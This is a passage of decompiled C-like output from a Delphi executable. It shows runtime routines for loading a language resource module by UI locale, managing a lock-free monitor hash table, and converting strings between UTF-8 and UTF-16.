  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  sub_406C44(a3);
  for ( i = 1; i <= System::__linkproc__ LStrLen(v10); ++i )
  {
    v5 = i;
    while ( i <= System::__linkproc__ LStrLen(v10) && *(_WORD *)(v10 + 2 * i - 2) != 44 )
      ++i;
    if ( i != v5 )
    {
      sub_407AD8(v10, v5, i - v5, &v9);
      sub_407968(a3, v11, v9);
      if ( (unsigned __int8)sub_409B00(*a3, i) )
        goto LABEL_11;
    }
  }
  sub_406C44(a3);
LABEL_11:
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_409C2E;
  return sub_406CA4((int)&v9, 3);
}
// 406D28: using guessed type int __fastcall System::__linkproc__ LStrAddRef(_DWORD);
// 4070F8: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);

//----- (00409C38) --------------------------------------------------------
_DWORD *__fastcall sub_409C38(void *a1, volatile __int32 *a2)
{
  LANGID UserDefaultUILanguage; // ax
  unsigned int v5[2]; // [esp-Ch] [ebp-24h] BYREF
  int *v6; // [esp-4h] [ebp-1Ch]
  void *v7; // [esp+4h] [ebp-14h] BYREF
  void *v8; // [esp+8h] [ebp-10h] BYREF
  WCHAR LCData[4]; // [esp+Ch] [ebp-Ch] BYREF
  void *v10; // [esp+14h] [ebp-4h] BYREF
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v7 = 0;
  v8 = 0;
  v10 = a1;
  System::__linkproc__ LStrAddRef(a1);
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_409CF8;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  UserDefaultUILanguage = GetUserDefaultUILanguage();
  GetLocaleInfoW(UserDefaultUILanguage, 3u, LCData, 4);
  unknown_libname_51(&v8, LCData, 4);
  sub_407968(a2, v10, v8);
  if ( !(unsigned __int8)sub_409B00(*a2, (int)a2) )
  {
    LCData[2] = 0;
    unknown_libname_51(&v7, LCData, 4);
    sub_407968(a2, v10, v7);
    if ( !(unsigned __int8)sub_409B00(*a2, (int)a2) )
      sub_406C44(a2);
  }
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_409CFF;
  sub_406CA4((int)&v7, 2);
  return sub_406C44(&v10);
}
// 406D28: using guessed type int __fastcall System::__linkproc__ LStrAddRef(_DWORD);
// 407824: using guessed type int __fastcall unknown_libname_51(_DWORD, _DWORD, _DWORD);

//----- (00409D04) --------------------------------------------------------
int __usercall sub_409D04@<eax>(int a1@<eax>, int a2@<edx>, volatile __int32 *a3@<ecx>, int a4@<ebx>, int a5@<esi>)
{
  int v6; // eax
  int v7; // ebx
  int v8; // eax
  int v9; // eax
  unsigned int v11[2]; // [esp-14h] [ebp-2Ch] BYREF
  int *v12; // [esp-Ch] [ebp-24h]
  int v13; // [esp-8h] [ebp-20h]
  int v14; // [esp-4h] [ebp-1Ch]
  int v15; // [esp+0h] [ebp-18h] BYREF
  int v16; // [esp+4h] [ebp-14h] BYREF
  int v17; // [esp+8h] [ebp-10h] BYREF
  int v18; // [esp+Ch] [ebp-Ch] BYREF
  __int32 v19; // [esp+10h] [ebp-8h]
  int v20; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v18 = 0;
  v17 = 0;
  v16 = 0;
  v15 = 0;
  v14 = a4;
  v13 = a5;
  v19 = a2;
  v20 = a1;
  System::__linkproc__ LStrAddRef(a1);
  System::__linkproc__ LStrAddRef(v19);
  v12 = &savedregs;
  v11[1] = (unsigned int)&loc_409E1B;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  sub_406C44(a3);
  if ( v19 )
  {
    sub_407030(&v17, v19);
    v6 = v19;
    if ( v19 )
      v6 = *(_DWORD *)(v19 - 4);
    v7 = v6;
    if ( v6 >= 1 )
    {
      while ( *(_WORD *)(v19 + 2 * v7 - 2) != 46 )
      {
        if ( !--v7 )
          goto LABEL_8;
      }
      sub_407AD8(v19, 1, v7, &v17);
    }
LABEL_8:
    sub_409A40(v20, (int)&v18);
    if ( v18 )
    {
      sub_409B6C((void *)v17, v18, a3);
    }
    else
    {
      LOWORD(v8) = GetUserDefaultUILanguage();
      sub_4093F0(v8, &v16);
      sub_409B6C((void *)v17, v16, a3);
      if ( !*a3 && !byte_46BC08 )
      {
        LOWORD(v9) = GetSystemDefaultUILanguage();
        sub_4093F0(v9, &v15);
        sub_409B6C((void *)v17, v15, a3);
      }
      if ( !*a3 )
        sub_409C38((void *)v17, a3);
    }
  }
  __writefsdword(0, v11[0]);
  v12 = (int *)&loc_409E22;
  return sub_406CA4((int)&v15, 6);
}
// 409D04: could not find valid save-restore pair for ebx
// 409D04: could not find valid save-restore pair for esi
// 409DB7: variable 'v8' is possibly undefined
// 409DDF: variable 'v9' is possibly undefined
// 406D28: using guessed type int __fastcall System::__linkproc__ LStrAddRef(_DWORD);
// 46BC08: using guessed type char byte_46BC08;

//----- (00409E28) --------------------------------------------------------
HMODULE __fastcall sub_409E28(int a1)
{
  HMODULE Library; // ebx
  const WCHAR *v3; // eax
  int v5; // [esp-10h] [ebp-230h]
  unsigned int v6[2]; // [esp-Ch] [ebp-22Ch] BYREF
  int *v7; // [esp-4h] [ebp-224h]
  int v8; // [esp+8h] [ebp-218h] BYREF
  int v9; // [esp+Ch] [ebp-214h] BYREF
  WCHAR Filename[261]; // [esp+12h] [ebp-20Eh] BYREF
  int v11; // [esp+21Ch] [ebp-4h] BYREF
  int savedregs; // [esp+220h] [ebp+0h] BYREF

  v9 = 0;
  v8 = 0;
  v11 = 0;
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_409EE2;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  Library = 0;
  GetModuleFileNameW(0, Filename, 0x105u);
  unknown_libname_50(&v9, a1);
  v5 = v9;
  unknown_libname_51(&v8, Filename, 261);
  sub_409D04(v8, v5, &v11, 0, a1);
  if ( v11 )
  {
    v3 = (const WCHAR *)sub_407790(v11);
    Library = LoadLibraryExW(v3, 0, 2u);
  }
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_409EE9;
  sub_406CA4((int)&v8, 2);
  sub_406C44(&v11);
  return Library;
}
// 4077E8: using guessed type int __fastcall unknown_libname_50(_DWORD, _DWORD);
// 407824: using guessed type int __fastcall unknown_libname_51(_DWORD, _DWORD, _DWORD);
// 409E28: using guessed type int var_214;

//----- (00409F14) --------------------------------------------------------
int __fastcall sub_409F14(int result)
{
  int v1; // ebp
  int v2; // edi
  _DWORD **v3; // ebx
  _DWORD *v4; // esi

  v1 = result;
  v2 = dword_465040;
  if ( dword_465040 && (result = *(_DWORD *)(dword_465040 + 4), result == v1) )
  {
    dword_465040 = *(_DWORD *)dword_465040;
    return System::__linkproc__ FreeMem(v2);
  }
  else
  {
    v3 = (_DWORD **)dword_465040;
    if ( dword_465040 )
    {
      while ( 1 )
      {
        v4 = *v3;
        if ( *v3 )
        {
          result = v4[1];
          if ( result == v1 )
            break;
        }
        v3 = (_DWORD **)*v3;
        if ( !v3 )
          return result;
      }
      *v3 = (_DWORD *)*v4;
      return System::__linkproc__ FreeMem(v4);
    }
  }
  return result;
}
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);
// 465040: using guessed type int dword_465040;

//----- (0040A6D8) --------------------------------------------------------
int __fastcall sub_40A6D8(int a1)
{
  int result; // eax
  int *v2; // edx
  int v3; // ecx
  int v4; // esi
  int v5; // ebx
  _DWORD *v6; // ecx
  int v7; // ecx
  int v8; // esi
  int v9; // ebx
  _DWORD *v10; // ecx
  int v12; // [esp+8h] [ebp-14h]

  result = 31;
  v2 = (int *)(a1 + 8);
  do
  {
    v3 = *v2;
    if ( *v2 )
      v3 = *(_DWORD *)(*v2 - 4);
    if ( v3 - 1 >= 0 )
    {
      v4 = v3;
      v5 = 0;
      do
      {
        v6 = *(_DWORD **)(*v2 + 4 * v5);
        if ( v6 )
        {
          *v6 = 0;
          *(_DWORD *)(*v2 + 4 * v5) = 0;
        }
        ++v5;
        --v4;
      }
      while ( v4 );
    }
    v12 = v2[31];
    v7 = v12;
    if ( v12 )
      v7 = *(_DWORD *)(v12 - 4);
    if ( v7 - 1 >= 0 )
    {
      v8 = v7;
      v9 = 0;
      do
      {
        v10 = *(_DWORD **)(v2[31] + 4 * v9);
        if ( v10 )
        {
          *v10 = 0;
          v10[1] = 0;
          *(_DWORD *)(v2[31] + 4 * v9) = 0;
        }
        ++v9;
        --v8;
      }
      while ( v8 );
    }
    ++v2;
    --result;
  }
  while ( result );
  return result;
}

//----- (0040A770) --------------------------------------------------------
int __fastcall sub_40A770(int result)
{
  if ( dword_4698F4 )
    return sub_405BA0(*(_DWORD *)(result + 4), 0xFFFFFFFF);
  return result;
}
// 4698F4: using guessed type int dword_4698F4;

//----- (0040A788) --------------------------------------------------------
int __fastcall sub_40A788(int result)
{
  if ( dword_4698F4 )
    return sub_405D38(*(_DWORD *)(result + 4));
  return result;
}
// 4698F4: using guessed type int dword_4698F4;

//----- (0040A79C) --------------------------------------------------------
int __fastcall sub_40A79C(_DWORD *a1)
{
  int result; // eax

  sub_40A6D8((int)a1);
  result = 0;
  *a1 = 0;
  return result;
}

//----- (0040A7AC) --------------------------------------------------------
int __usercall sub_40A7AC@<eax>(int a1@<eax>, int a2@<ebx>)
{
  LOBYTE(a2) = a1 != 0;
  if ( a1 )
  {
    sub_40A6D8(a1);
    sub_405B58(*(_DWORD *)(a1 + 4));
    System::__linkproc__ Dispose(a1, &byte_40A118);
  }
  return a2;
}
// 408534: using guessed type int __fastcall System::__linkproc__ Dispose(_DWORD, _DWORD);
// 40A118: using guessed type char byte_40A118;

//----- (0040A7DC) --------------------------------------------------------
int __fastcall sub_40A7DC(int a1, int a2, unsigned int a3)
{
  int v4; // esi
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // ebx
  int v10; // eax
  int v11; // ebx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-28h] BYREF
  void *v13; // [esp-8h] [ebp-24h]
  int *v14; // [esp-4h] [ebp-20h]
  int v15; // [esp+Ch] [ebp-10h]
  int v16; // [esp+10h] [ebp-Ch]
  unsigned int v17; // [esp+14h] [ebp-8h]
  int v18; // [esp+18h] [ebp-4h]
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v17 = a3;
  v18 = a1;
  v4 = (int)((a3 >> 5) + (a3 >> 13)) % 31;
  sub_40A770(a1);
  v14 = &savedregs;
  v13 = &loc_40A8BD;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v16 = *(_DWORD *)(a2 + 4 * v4);
  v5 = v16;
  if ( v16 )
    v5 = *(_DWORD *)(v16 - 4);
  v6 = v5 - 1;
  if ( v6 < 0 )
  {
LABEL_8:
    v15 = *(_DWORD *)(a2 + 4 * v4);
    v10 = v15;
    if ( v15 )
      v10 = *(_DWORD *)(v15 - 4);
    v11 = v10;
    if ( v10 )
      System::__linkproc__ DynArraySetLength(2 * v10);
    else
      System::__linkproc__ DynArraySetLength(10);
    *(_DWORD *)(*(_DWORD *)(a2 + 4 * v4) + 4 * v11) = v17;
    __writefsdword(0, (unsigned int)ExceptionList);
    v14 = (int *)&loc_40A8C4;
    return sub_40A788(v18);
  }
  else
  {
    v7 = v6 + 1;
    v8 = 0;
    while ( *(_DWORD *)(*(_DWORD *)(a2 + 4 * v4) + 4 * v8) )
    {
      ++v8;
      if ( !--v7 )
        goto LABEL_8;
    }
    *(_DWORD *)(*(_DWORD *)(a2 + 4 * v4) + 4 * v8) = v17;
    return System::__linkproc__ TryFinallyExit(ExceptionList, v13, v14);
  }
}
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);

//----- (0040A8CC) --------------------------------------------------------
int __fastcall sub_40A8CC(int a1, int a2, unsigned int a3)
{
  int v4; // ebx
  int v5; // eax
  int v6; // edx
  int v7; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-20h] BYREF
  void *v10; // [esp-8h] [ebp-1Ch]
  int *v11; // [esp-4h] [ebp-18h]
  int v12; // [esp+8h] [ebp-Ch]
  unsigned int v13; // [esp+Ch] [ebp-8h]
  int v14; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v13 = a3;
  v14 = a1;
  v4 = (int)((a3 >> 5) + (a3 >> 13)) % 31;
  sub_40A770(a1);
  v11 = &savedregs;
  v10 = &loc_40A959;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v12 = *(_DWORD *)(a2 + 4 * v4);
  v5 = v12;
  if ( v12 )
    v5 = *(_DWORD *)(v12 - 4);
  if ( v5 - 1 < 0 )
  {
LABEL_8:
    __writefsdword(0, (unsigned int)ExceptionList);
    v11 = (int *)&loc_40A960;
    return sub_40A788(v14);
  }
  else
  {
    v6 = v5;
    v7 = 0;
    while ( *(_DWORD *)(*(_DWORD *)(a2 + 4 * v4) + 4 * v7) != v13 )
    {
      ++v7;
      if ( !--v6 )
        goto LABEL_8;
    }
    *(_DWORD *)(*(_DWORD *)(a2 + 4 * v4) + 4 * v7) = 0;
    return System::__linkproc__ TryFinallyExit(ExceptionList, v10, v11);
  }
}
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);

//----- (0040A968) --------------------------------------------------------
int __fastcall sub_40A968(int a1, int a2, int a3)
{
  int v6; // eax
  int v7; // eax
  int v8; // ebp
  int result; // eax
  int v10; // [esp+0h] [ebp-1Ch]
  int v11; // [esp+4h] [ebp-18h]
  int v12; // [esp+8h] [ebp-14h]

  v10 = *(_DWORD *)(a1 + 8);
  v6 = v10;
  if ( v10 )
    v6 = *(_DWORD *)(v10 - 4);
  if ( v6 )
  {
    v11 = *(_DWORD *)(a1 + 8);
    v7 = v11;
    if ( v11 )
      v7 = *(_DWORD *)(v11 - 4);
    if ( v7 == *(_DWORD *)(a1 + 4) )
    {
      v12 = *(_DWORD *)(a1 + 8);
      v8 = v12;
      if ( v12 )
        v8 = *(_DWORD *)(v12 - 4);
      System::__linkproc__ DynArraySetLength(2 * v8);
    }
  }
  else
  {
    System::__linkproc__ DynArraySetLength(10);
  }
  result = *(_DWORD *)(a1 + 4);
  if ( a2 < result )
  {
    System::Move(
      (const void *)(*(_DWORD *)(a1 + 8) + 4 * a2),
      (void *)(*(_DWORD *)(a1 + 8) + 4 * a2 + 4),
      4 * (result - a2));
    result = *(_DWORD *)(a1 + 8);
    *(_DWORD *)(result + 4 * a2) = a3;
  }
  else
  {
    *(_DWORD *)(*(_DWORD *)(a1 + 8) + 4 * result) = a3;
  }
  ++*(_DWORD *)(a1 + 4);
  return result;
}
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);

//----- (0040AA28) --------------------------------------------------------
int __fastcall sub_40AA28(int a1, int a2, signed int *a3)
{
  int v3; // ecx
  signed int v4; // esi
  int v5; // edi
  unsigned int v6; // ebx
  int v7; // ecx
  int v10; // [esp+4h] [ebp-14h]

  v10 = 0;
  v3 = *(_DWORD *)(a1 + 4);
  if ( v3 <= 0 )
  {
    *a3 = 0;
  }
  else
  {
    v4 = 0;
    v5 = v3 - 1;
    while ( v5 >= v4 )
    {
      v6 = (unsigned int)(v5 + v4) >> 1;
      v7 = **(_DWORD **)(*(_DWORD *)(a1 + 8) + 4 * v6) - a2;
      if ( v7 >= 0 )
      {
        v5 = v6 - 1;
        if ( !v7 )
        {
          v10 = *(_DWORD *)(*(_DWORD *)(a1 + 8) + 4 * v6);
          v4 = v6;
        }
      }
      else
      {
        v4 = v6 + 1;
      }
    }
    *a3 = v4;
  }
  return v10;
}

//----- (0040AA98) --------------------------------------------------------
_DWORD *__fastcall sub_40AA98(int *a1)
{
  int v2; // ebx
  int v3; // edi

  if ( a1[1] - 1 >= 0 )
  {
    v2 = a1[1];
    v3 = 0;
    do
      sub_40A7AC(*(_DWORD *)(a1[2] + 4 * v3++), v2--);
    while ( v2 );
  }
  a1[1] = 0;
  sub_405B58(*a1);
  return sub_408B34(a1 + 2, (int)dword_40A684);
}
// 40A684: using guessed type int dword_40A684[6];

//----- (0040AAD8) --------------------------------------------------------
int __fastcall sub_40AAD8(int *a1)
{
  int result; // eax

  *a1 = sub_405AE0();
  result = 0;
  a1[1] = 0;
  return result;
}

//----- (0040AAEC) --------------------------------------------------------
int *__fastcall sub_40AAEC(int *result)
{
  if ( dword_4698F4 )
    return (int *)sub_405BA0(*result, 0xFFFFFFFF);
  return result;
}
// 4698F4: using guessed type int dword_4698F4;

//----- (0040AB00) --------------------------------------------------------
int __fastcall sub_40AB00(int a1, int a2, signed int a3)
{
  int v4; // esi
  signed int v6[4]; // [esp+0h] [ebp-10h] BYREF

  v6[0] = a3;
  v4 = sub_40AA28(a1, a2, v6);
  if ( v4 && *(_DWORD *)(a1 + 4) > v6[0] )
  {
    if ( *(_DWORD *)(a1 + 4) - 1 > v6[0] )
      System::Move(
        (const void *)(*(_DWORD *)(a1 + 8) + 4 * v6[0] + 4),
        (void *)(*(_DWORD *)(a1 + 8) + 4 * v6[0]),
        4 * (*(_DWORD *)(a1 + 4) - v6[0] - 1));
    --*(_DWORD *)(a1 + 4);
  }
  return v4;
}
// 40AB00: using guessed type signed int var_10[4];

//----- (0040AB54) --------------------------------------------------------
int *__fastcall sub_40AB54(int *result)
{
  if ( dword_4698F4 )
    return (int *)sub_405D38(*result);
  return result;
}
// 4698F4: using guessed type int dword_4698F4;

//----- (0040AB68) --------------------------------------------------------
int __fastcall sub_40AB68(int a1, signed __int32 *a2)
{
  signed __int32 v3; // ecx
  int result; // eax

  if ( _InterlockedIncrement((volatile signed __int32 *)(a1 + 2368)) > 512 )
  {
    _InterlockedExchangeAdd((volatile signed __int32 *)(a1 + 2368), 0xFFFFFFFF);
    return sub_40A7AC((int)a2, a1);
  }
  else
  {
    do
    {
      v3 = *(_DWORD *)(a1 + 2364);
      *a2 = v3;
      result = _InterlockedCompareExchange((volatile signed __int32 *)(a1 + 2364), (signed __int32)a2, v3);
    }
    while ( v3 != result );
  }
  return result;
}

//----- (0040ABB4) --------------------------------------------------------
signed __int32 *__fastcall sub_40ABB4(int a1, signed __int32 a2)
{
  signed __int32 *result; // eax

  result = sub_40ABCC(a1);
  if ( !result )
    result = (signed __int32 *)sub_40A6BC();
  *result = a2;
  return result;
}
// 40A6BC: using guessed type int sub_40A6BC(void);

//----- (0040ABCC) --------------------------------------------------------
signed __int32 *__fastcall sub_40ABCC(int a1)
{
  signed __int32 *v1; // edx

  do
    v1 = *(signed __int32 **)(a1 + 2364);
  while ( v1
       && v1 != (signed __int32 *)_InterlockedCompareExchange(
                                    (volatile signed __int32 *)(a1 + 2364),
                                    *v1,
                                    (signed __int32)v1) );
  if ( v1 )
    _InterlockedExchangeAdd((volatile signed __int32 *)(a1 + 2368), 0xFFFFFFFF);
  return v1;
}

//----- (0040AC00) --------------------------------------------------------
int __fastcall sub_40AC00(int result)
{
  int v1; // esi
  int v2; // edi
  int *v3; // ebx
  signed __int32 *v4; // eax

  v1 = result;
  if ( *(_BYTE *)(result + 2376) )
  {
    v2 = 197;
    v3 = (int *)result;
    do
    {
      sub_40AA98(v3);
      v3 += 3;
      --v2;
    }
    while ( v2 );
    do
      v4 = sub_40ABCC(v1);
    while ( (unsigned __int8)sub_40A7AC((int)v4, (int)v3) );
    result = *(_DWORD *)(v1 + 2372);
    if ( result )
      return sub_405B58(result);
  }
  return result;
}

//----- (0040AC48) --------------------------------------------------------
int __fastcall sub_40AC48(int result)
{
  int v1; // eax
  int v2; // esi
  int *v3; // ebx
  unsigned int v4[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v5; // [esp-4h] [ebp-10h]
  int v6; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v6 = result;
  if ( !*(_BYTE *)(result + 2376) )
  {
    if ( !*(_DWORD *)(v6 + 2372) )
    {
      v1 = _InterlockedCompareExchange((volatile signed __int32 *)(v6 + 2372), sub_405AE0(), 0);
      if ( v1 )
        sub_405B58(v1);
    }
    sub_405BA0(*(_DWORD *)(v6 + 2372), 0xFFFFFFFF);
    v5 = &savedregs;
    v4[1] = (unsigned int)&loc_40ACF6;
    v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v4);
    if ( !*(_BYTE *)(v6 + 2376) )
    {
      v2 = 197;
      v3 = (int *)v6;
      do
      {
        sub_40AAD8(v3);
        v3 += 3;
        --v2;
      }
      while ( v2 );
      *(_BYTE *)(v6 + 2376) = 1;
    }
    __writefsdword(0, v4[0]);
    v5 = (int *)&loc_40ACFD;
    return sub_405D38(*(_DWORD *)(v6 + 2372));
  }
  return result;
}

//----- (0040AD04) --------------------------------------------------------
int *__fastcall sub_40AD04(int *result, unsigned int a2)
{
  signed int v3; // ecx
  unsigned int v4[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v5; // [esp-4h] [ebp-18h]
  signed __int32 *v6; // [esp+8h] [ebp-Ch]
  int v7; // [esp+Ch] [ebp-8h]
  int *v8; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v8 = result;
  if ( *((_BYTE *)result + 2376) )
  {
    v7 = (int)((a2 >> 5) + (a2 >> 13)) % 197;
    sub_40AAEC(&v8[3 * v7]);
    v5 = &savedregs;
    v4[1] = (unsigned int)&loc_40AD86;
    v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v4);
    v6 = (signed __int32 *)sub_40AB00((int)&v8[3 * ((int)((a2 >> 5) + (a2 >> 13)) % 197)], a2, v3);
    __writefsdword(0, v4[0]);
    v5 = (int *)&loc_40AD8D;
    result = sub_40AB54(&v8[3 * v7]);
    if ( v6 )
    {
      sub_40A79C(v6);
      return (int *)sub_40AB68((int)v8, v6);
    }
  }
  return result;
}
// 40AD5F: variable 'v3' is possibly undefined

//----- (0040ADAC) --------------------------------------------------------
int __fastcall sub_40ADAC(int a1, unsigned int a2, unsigned int a3)
{
  int v4; // esi
  signed __int32 *v5; // ebx
  unsigned int v7[2]; // [esp-Ch] [ebp-2Ch] BYREF
  int *v8; // [esp-4h] [ebp-24h]
  signed __int32 *v9; // [esp+8h] [ebp-18h]
  signed __int32 *v10; // [esp+Ch] [ebp-14h]
  signed int v11; // [esp+10h] [ebp-10h] BYREF
  int v12; // [esp+14h] [ebp-Ch]
  unsigned int v13; // [esp+18h] [ebp-8h]
  int v14; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v13 = a2;
  v14 = a1;
  if ( !*(_BYTE *)(a1 + 2376) )
    sub_40AC48(v14);
  v12 = (int)((a3 >> 5) + (a3 >> 13)) % 197;
  v4 = 3 * v12;
  sub_40AAEC((int *)(v14 + 12 * v12));
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_40AE5D;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v10 = (signed __int32 *)sub_40AA28(v14 + 12 * v12, a3, &v11);
  if ( !v10 )
  {
    v5 = sub_40ABB4(v14, a3);
    sub_40A968(v14 + 4 * v4, v11, (int)v5);
    v10 = v5;
  }
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_40AE64;
  sub_40AB54((int *)(v14 + 12 * v12));
  v9 = v10;
  return sub_40A7DC((int)v10, (int)(v10 + 2), v13);
}

//----- (0040AE84) --------------------------------------------------------
int *__fastcall sub_40AE84(int *result, unsigned int a2, unsigned int a3)
{
  unsigned int v4[2]; // [esp-Ch] [ebp-2Ch] BYREF
  int *v5; // [esp-4h] [ebp-24h]
  int v6; // [esp+8h] [ebp-18h]
  int v7; // [esp+Ch] [ebp-14h]
  signed int v8; // [esp+10h] [ebp-10h] BYREF
  int v9; // [esp+14h] [ebp-Ch]
  unsigned int v10; // [esp+18h] [ebp-8h]
  int *v11; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v10 = a2;
  v11 = result;
  if ( *((_BYTE *)result + 2376) )
  {
    v9 = (int)((a3 >> 5) + (a3 >> 13)) % 197;
    sub_40AAEC(&v11[3 * v9]);
    v5 = &savedregs;
    v4[1] = (unsigned int)&loc_40AF0C;
    v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v4);
    v7 = sub_40AA28((int)&v11[3 * ((int)((a3 >> 5) + (a3 >> 13)) % 197)], a3, &v8);
    __writefsdword(0, v4[0]);
    v5 = (int *)&loc_40AF13;
    result = sub_40AB54(&v11[3 * v9]);
    if ( v7 )
    {
      v6 = v7;
      return (int *)sub_40A8CC(v7, v7 + 8, v10);
    }
  }
  return result;
}

//----- (0040AF38) --------------------------------------------------------
volatile signed __int32 *__fastcall sub_40AF38(_DWORD *a1)
{
  volatile signed __int32 *result; // eax

  result = (volatile signed __int32 *)sub_405DF8(a1);
  _interlockedbittestandset(result, 0);
  return result;
}

//----- (0040AF44) --------------------------------------------------------
int __fastcall sub_40AF44(int result, _DWORD *a2)
{
  unsigned int v3; // edi

  v3 = result;
  if ( a2 )
  {
    if ( (*((_BYTE *)a2 + *(_DWORD *)(*a2 - 52) - 4) & 1) == 0 )
      sub_40AF38(a2);
    return sub_40ADAC((int)dword_46BCD0, v3, (unsigned int)a2);
  }
  return result;
}
// 46BCD0: using guessed type int dword_46BCD0[595];

//----- (0040AF7C) --------------------------------------------------------
int *__fastcall sub_40AF7C(int *result, unsigned int a2)
{
  if ( a2 )
    return sub_40AE84(dword_46BCD0, (unsigned int)result, a2);
  return result;
}
// 46BCD0: using guessed type int dword_46BCD0[595];

//----- (0040AF90) --------------------------------------------------------
int *__fastcall sub_40AF90(int *result)
{
  if ( (*((_BYTE *)result + *(_DWORD *)(*result - 52) - 4) & 1) != 0 )
    return sub_40AD04(dword_46BCD0, (unsigned int)result);
  return result;
}
// 46BCD0: using guessed type int dword_46BCD0[595];

//----- (0040AFB0) --------------------------------------------------------
int *__fastcall sub_40AFB0(int *a1)
{
  int *v3; // eax

  if ( *a1 )
  {
    v3 = sub_4057C0(*a1, (int)&cls_System_TObject);
    *a1 = 0;
    sub_40AF7C(a1, (unsigned int)v3);
  }
  return a1;
}
// 401530: using guessed type __int16 cls_System_TObject;

//----- (0040AFDC) --------------------------------------------------------
int __fastcall sub_40AFDC(int *a1, int a2)
{
  int *v3; // eax
  int *v5; // [esp-10h] [ebp-18h]
  unsigned int v6[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v7; // [esp-4h] [ebp-Ch]
  int v8; // [esp+4h] [ebp-4h] BYREF
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v8 = a2;
  unknown_libname_60(a2);
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_40B035;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  v5 = sub_40AFB0(a1);
  v3 = sub_4057C0(v8, (int)&cls_System_TObject);
  sub_40AF44((int)v5, v3);
  *a1 = v8;
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_40B03C;
  return System::__linkproc__ IntfClear(&v8);
}
// 401530: using guessed type __int16 cls_System_TObject;
// 40A04C: using guessed type int __fastcall System::__linkproc__ IntfClear(_DWORD);
// 40A0C0: using guessed type int __fastcall unknown_libname_60(_DWORD);

//----- (0040B040) --------------------------------------------------------
int __fastcall sub_40B040(int a1)
{
  return *(_DWORD *)(a1 + 4) & 0x7FFFFFFF;
}

//----- (0040B04C) --------------------------------------------------------
int __fastcall sub_40B04C(int result)
{
  _InterlockedDecrement((volatile signed __int32 *)(result + 4));
  return result;
}

//----- (0040B058) --------------------------------------------------------
int __fastcall sub_40B058(int result, int a2, int a3)
{
  if ( (*(_DWORD *)(result + 4) & 0x7FFFFFFF) != 0 )
    sub_404ED0(2, a2, a3);
  return result;
}

//----- (0040B108) --------------------------------------------------------
unsigned int __fastcall sub_40B108(
        CHAR *lpDefaultChar,
        unsigned int a2,
        LPCWSTR lpWideCharStr,
        LPBOOL lpUsedDefaultChar)
{
  unsigned int result; // eax

  result = 0;
  if ( lpWideCharStr )
  {
    if ( lpDefaultChar )
    {
      result = sub_40B588(0xFDE9u, 0, lpWideCharStr, (int)lpUsedDefaultChar, lpDefaultChar, a2, 0, 0);
      if ( result && result <= a2 && (lpUsedDefaultChar != (LPBOOL)-1 || lpDefaultChar[result - 1]) )
      {
        if ( result == a2 )
        {
          while ( result > 1 && lpDefaultChar[result - 1] < 0 && (lpDefaultChar[result - 1] & 0xC0) != 0xC0 )
            --result;
        }
        else
        {
          ++result;
        }
        lpDefaultChar[result - 1] = 0;
      }
    }
    else
    {
      return sub_40B588(0xFDE9u, 0, lpWideCharStr, (int)lpUsedDefaultChar, 0, 0, 0, 0);
    }
  }
  return result;
}

//----- (0040B1A8) --------------------------------------------------------
unsigned int __fastcall sub_40B1A8(LPWSTR lpWideCharStr, unsigned int cbMultiByte, const CHAR *a3, int cchWideChar)
{
  unsigned int result; // eax

  result = 0;
  if ( a3 )
  {
    if ( lpWideCharStr && cbMultiByte )
    {
